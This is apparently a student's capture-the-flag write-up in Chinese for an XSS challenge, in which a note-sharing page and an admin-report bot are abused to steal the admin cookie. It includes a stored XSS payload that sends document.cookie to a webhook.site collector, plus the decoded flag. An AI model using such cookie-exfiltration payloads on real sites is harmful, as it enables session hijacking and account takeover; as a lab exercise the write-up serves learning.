#Web 


目標: 拿 admin cookie

---
# XSS1
## 題目
給了一個網址，點開來：
![[W6-1_web.png|322]]
精簡版 source code
```js
<body>
	<h1>🌏XSS1 - Note Sharing</h1>
	<form method="post">
		<textarea name="note" rows="4" cols="50"></textarea><br />
		<button class="btn" type="submit">Submit Note</button>
	</form>
	<form action="/report" method="get">
		<button class="btn" type="submit">
			Report to admin
		</button>
	</form>
</body>
```


- **Submit Note：** 把輸入顯示在新的連結頁面上
  ![[W6-1_web_note.png|183]]

- **Report to admin**：會把輸入的 URL 給 admin 讓 admin 讀
	![[W6-1_web2.png|344]]
	精簡版 source code：
	```js
	<body>
		<h1>Report URL</h1>
		<form method="POST">
			<label for="urlInput">Enter URL:</label>
			<input type="text" id="urlInput" name="url" required />
			<button class="btn" type="submit">Report URL</button>
		</form>
	</body>
	```
	

## 解題
1. 題目為 XSS -> 找可以「攻擊自己的頁面」讓別人讀取 ->  Submit Note 後的 Note Content
2. 目標為拿到 admin 的 cookie -> 檢查 Note Content 網頁用的 SameSite cookie method
   ![[W6-1_samesite.png]]
   -> Lax
   > [!abstract] SameSite cookie - Lax（常見預設）
   >  Cross-Site request 同時符合以下條件才帶 Cookie：
   >  - Top-level navigation：`location` / `<form>` / `<a>`
   >  -  不包含 `<iframe>` / `<img>` 等 Cross-Site embedding
   >  - 常見：
   > 		 - **Safe**：`GET` / `HEAD` / `OPTIONS`　
   > 		 - **Unsafe**：`POST` / `PUT` / `DELETE` …
   >  - Chrome：未指定 SameSite 的新 Cookie，2 分鐘內允許 POST

   -> admin GET 時會攜帶 cookie
   -> 讓 admin GET Note Content 頁面並想辦法留下 cookie
3. 使用 XSS 手法把訪問者資訊送出到目的地 -> 用 `fetch()`
4. 開 [webhook](https://webhook.site/) 獲取臨時的自己的網址作為接收資訊的目的地，在 note 區輸入:
	```js
	<script>
		fetch("https://webhook.site/[臨時網址]?aaa="+btoa(document.cookie))
	</script>
	```
	送出後複製 Note Content 網址
5. 到 Report to admin 輸入 Note Content 網址，並到 webhook 找
   ![[W6-1_aaa.png]]
6. aaa = `ZmxhZz1DVEZ7eHNzMV85Y2VlNDVlNWRiNjc3YTFlNWNmYjRjOTB9`，用 base64 decode
	```bash
	echo -n "ZmxhZz1DVEZ7eHNzMV85Y2VlNDVlNWRiNjc3YTFlNWNmYjRjOTB9" | base64 -d
	```
7. flag = `CTF{xss1_9cee45e5db677a1e5cfb4c90}`





---
# XSS3
```
javascript:fetch(...)
```
